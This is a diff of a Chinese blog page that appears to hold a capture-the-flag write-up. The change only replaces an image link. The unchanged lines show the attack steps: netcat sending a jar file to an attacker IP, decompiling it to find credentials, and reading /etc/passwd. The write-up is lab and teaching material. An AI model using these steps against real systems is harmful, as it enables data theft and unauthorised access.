@@ -27,7 +27,7 @@ dirsearch1234567"><meta name="keywords" content="Blog,博客,Hexo"><meta content
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">方法一</span><br><span class="line">nc -nv  10.10.16.45 8888 &lt;  cloudhosting-0.0.1.jar</span><br><span class="line">nc -lvvp 8888 &gt;  cloudhosting-0.0.1.jar</span><br><span class="line"></span><br><span class="line">方法二</span><br><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
 
 <p>将文件用<code>jd-gui</code>反汇编，可以发现一对账号密码</p>
-<p><img src="C:\Users\24603\AppData\Roaming\Typora\typora-user-images\image-20231211211457264.png" alt="image-20231211211457264"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/image-20231211211457264.png"></p>
 <p><code>cat /etc/passwd</code>中确实存在<code>postgres</code>用户;尝试ssh登陆一直失败，尝试登陆数据库</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app:x:1001:1001::/home/app:/bin/sh</span><br><span class="line">postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash</span><br><span class="line">josh:x:1003:1003::/home/josh:/usr/bin/bash</span><br></pre></td></tr></table></figure>
 
